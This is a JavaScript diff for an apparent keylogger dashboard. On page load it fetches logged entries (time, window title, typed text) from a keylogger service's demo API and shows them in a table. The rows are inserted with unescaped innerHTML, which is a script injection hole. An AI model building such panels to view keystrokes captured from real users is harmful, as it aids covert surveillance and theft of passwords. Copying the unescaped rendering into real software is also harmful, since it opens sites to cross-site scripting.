@@ -1,46 +1,33 @@
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
+
 async function get_logs(){
-    
     let response = await fetch("https://keylogger.shuvax.com/api/get_demo");
     let data = await response.json();
-    return data
-
-   
+    return data;
 }
+
 async function fetchLogs() {
-    const t = document.getElementById("Table");
-    t.innerHTML = "<tr><td colspan='3' class='text-center'>loading data...</td></tr>";
-    await sleep(300);
-    
+    const table = document.getElementById("Table");
+    table.innerHTML = "<tr><td colspan='3' class='text-center'>Loading data...</td></tr>";
 
-    
-    // const data = [
-    //     {time: "1233", window: "a", text: "fvfvf"},
-    //     {time:"4569",window:"b",text:"gbjfnds"},{time: "1233", window: "a", text: "fvfvf"},
-    //     {time:"4569",window:"b",text:"gbjfnds"},{time: "1233", window: "a", text: "fvfvf"},
-    //     {time:"4569",window:"b",text:"gbjfnds"}
-    // ]
-    const data = get_logs();
-    function add_rows(data_a){
-        const t = document.getElementById("Table");
-        t.innerHTML = ""
-        if (data_a.length === 0){
-            t.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
-        }else{
-            data_a.forEach(row => {
-                const r = document.createElement("tr");
-                r.innerHTML = `<td>${row.time}</td><td>${row.window}</td><td>${row.text}</td>`;
-                t.appendChild(r);
-            });  
-        }
-        
+    // await sleep(300);
 
+    const data = await get_logs();
+    console.log("נתונים מה-API:", data);
+
+    table.innerHTML = "";
+
+    if (!Array.isArray(data) || data.length === 0) { 
+        table.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
+    } else {
+        data.forEach(row => {
+            const r = document.createElement("tr");
+            r.innerHTML = `<td>${row.time}</td><td>${row.window}</td><td>${row.text}</td>`;
+            table.appendChild(r);
+        });  
     }
-
-add_rows(data)
 }
-
 
 document.addEventListener("DOMContentLoaded", fetchLogs);
